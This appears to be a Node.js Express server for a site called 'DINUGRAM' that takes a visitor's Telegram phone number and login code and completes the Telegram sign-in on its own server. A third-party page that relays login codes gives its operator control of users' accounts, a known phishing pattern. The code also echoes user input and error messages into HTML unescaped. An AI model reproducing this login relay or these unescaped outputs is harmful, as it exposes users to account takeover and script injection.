const express = require("express");
const { TelegramClient, Api } = require("telegram");
const { StringSession } = require("telegram/sessions");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PORT = process.env.PORT || 3000;
const apiId = Number(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

// Temporary login sessions for testing
const clients = new Map();

app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>DINUGRAM Login</title>
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1"
        />
      </head>

      <body>
        <h2>DINUGRAM</h2>

        <p>Enter your Telegram phone number</p>

        <form action="/send-code" method="POST">
          <input
            type="tel"
            name="phoneNumber"
            placeholder="+251..."
            required
          />

          <button type="submit">Send Code</button>
        </form>
      </body>
    </html>
  `);
});

app.get("/telegram-status", (req, res) => {
  res.json({
    connected: !!(apiId && apiHash),
    message:
      apiId && apiHash
        ? "Telegram API credentials loaded successfully"
        : "Telegram API credentials are missing"
  });
});

app.post("/send-code", async (req, res) => {
  try {
    const phoneNumber = req.body.phoneNumber;

    if (!phoneNumber) {
      return res.status(400).send("Phone number is required");
    }

    if (!apiId || !apiHash) {
      return res
        .status(500)
        .send("Telegram API credentials are missing");
    }

    const client = new TelegramClient(
      new StringSession(""),
      apiId,
      apiHash,
      {
        connectionRetries: 5
      }
    );

    await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phoneNumber,
        apiId: apiId,
        apiHash: apiHash,
        settings: new Api.CodeSettings({})
      })
    );

    const deliveryType =
      result.type?.className ||
      result.type?.constructor?.name ||
      "Unknown";

    console.log(
      "Telegram code delivery type:",
      deliveryType
    );

    console.log(
      "Code requested for phone ending:",
      phoneNumber.slice(-4)
    );

    clients.set(phoneNumber, {
      client: client,
      phoneCodeHash: result.phoneCodeHash
    });

    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>DINUGRAM Verification</title>

          <meta
            name="viewport"
            content="width=device-width, initial-scale=1"
          />
        </head>

        <body>
          <h2>DINUGRAM</h2>

          <p>Telegram verification code requested.</p>

          <p>
            Delivery type:
            <strong>${deliveryType}</strong>
          </p>

          <form action="/verify-code" method="POST">

            <input
              type="hidden"
              name="phoneNumber"
              value="${phoneNumber}"
            />

            <p>Enter Telegram login code</p>

            <input
              type="text"
              name="phoneCode"
              placeholder="Login code"
              autocomplete="one-time-code"
              required
            />

            <button type="submit">
              Verify Code
            </button>

          </form>
        </body>
      </html>
    `);

  } catch (error) {
    console.error("Send code error:", error);

    res.status(500).send(
      "Error: " +
        (error.message ||
          "Could not send verification code")
    );
  }
});

app.post("/verify-code", async (req, res) => {
  try {
    const phoneNumber = req.body.phoneNumber;
    const phoneCode = req.body.phoneCode;

    if (!phoneNumber || !phoneCode) {
      return res
        .status(400)
        .send("Phone number and code are required");
    }

    const loginData = clients.get(phoneNumber);

    if (!loginData) {
      return res.status(400).send(`
        <h2>DINUGRAM</h2>
        <p>Login session expired.</p>
        <p>Please go back and request a new code.</p>
        <a href="/">Back to Login</a>
      `);
    }

    const { client, phoneCodeHash } = loginData;

    const result = await client.invoke(
      new Api.auth.SignIn({
        phoneNumber: phoneNumber,
        phoneCodeHash: phoneCodeHash,
        phoneCode: phoneCode
      })
    );

    const session = client.session.save();

    console.log(
      "Telegram login successful for phone ending:",
      phoneNumber.slice(-4)
    );

    clients.delete(phoneNumber);

    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>DINUGRAM</title>

          <meta
            name="viewport"
            content="width=device-width, initial-scale=1"
          />
        </head>

        <body>
          <h2>DINUGRAM</h2>

          <h3>Login successful ✅</h3>

          <p>
            Your Telegram account connected successfully.
          </p>
        </body>
      </html>
    `);

  } catch (error) {
    console.error("Verify code error:", error);

    if (
      error.message &&
      error.message.includes("SESSION_PASSWORD_NEEDED")
    ) {
      return res.status(401).send(`
        <h2>DINUGRAM</h2>
        <p>Two-Step Verification password is required.</p>
        <p>We will add the password screen next.</p>
      `);
    }

    res.status(500).send(`
      <h2>DINUGRAM</h2>
      <p>Verification failed.</p>
      <p>${error.message || "Invalid verification code"}</p>
      <a href="/">Try Again</a>
    `);
  }
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`DINUGRAM running on port ${PORT}`);
});
